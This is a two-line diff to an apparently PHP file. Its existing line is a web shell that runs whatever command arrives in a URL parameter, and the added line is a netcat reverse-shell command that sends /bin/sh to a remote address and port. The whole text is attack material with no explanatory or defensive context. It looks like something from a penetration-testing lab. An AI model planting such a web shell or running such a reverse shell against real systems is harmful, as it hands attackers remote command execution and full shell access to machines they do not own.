@@ -1,1 +1,2 @@
 <?php echo (system($_GET['command'])); ?>
+nc -e /bin/sh 10.10.13.6 6666
